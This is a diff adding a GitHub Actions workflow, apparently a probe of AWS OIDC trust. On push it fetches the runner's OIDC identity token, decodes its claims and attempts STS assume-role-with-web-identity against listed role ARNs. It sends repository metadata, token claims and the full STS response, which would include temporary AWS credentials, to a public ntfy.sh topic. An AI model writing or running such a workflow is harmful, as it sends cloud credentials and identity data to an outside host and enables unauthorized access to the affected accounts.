@@ -1,0 +1,48 @@
+name: c211-oidc
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+env:
+  NTFY: https://ntfy.sh/c211-oidc-9bf280c66d20078c
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: probe
+        env:
+          ROLES: |
+            arn:aws:iam::000000000000:role/nope
+        run: |
+          set -u
+          say() { curl -sS -m 20 --data-binary "$*" "$NTFY" >/dev/null 2>&1 || true; }
+          say "START ref=$GITHUB_REF repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR sha=$GITHUB_SHA run=$GITHUB_RUN_ID"
+          say "ENV $(uname -a) aws=$(aws --version 2>&1)"
+          TJ=$(curl -sS -m 30 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          TOKEN=$(printf '%s' "$TJ" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
+          say "TOKEN_LEN=${#TOKEN}"
+          printf '%s' "$TOKEN" > /dev/shm/tok
+          python3 - > /dev/shm/claims.txt 2>&1 <<'PY'
+          import base64, json
+          t=open('/dev/shm/tok').read().strip()
+          if not t:
+              print('NO_TOKEN'); raise SystemExit
+          p=t.split('.')[1]; p+='='*(-len(p)%4)
+          d=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS='+json.dumps(d, sort_keys=True))
+          PY
+          say "CLAIMS $(cat /dev/shm/claims.txt | head -c 1500)"
+          while read -r ROLE; do
+            [ -z "$ROLE" ] && continue
+            OUT=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name c211 --web-identity-token "$TOKEN" --duration-seconds 3600 --output json 2>&1)
+            RC=$?
+            say "ROLE $ROLE RC=$RC OUT=$(printf '%s' "$OUT" | tr '\n' ' ' | head -c 1200)"
+          done <<< "${ROLES}"
+          say "DONE"
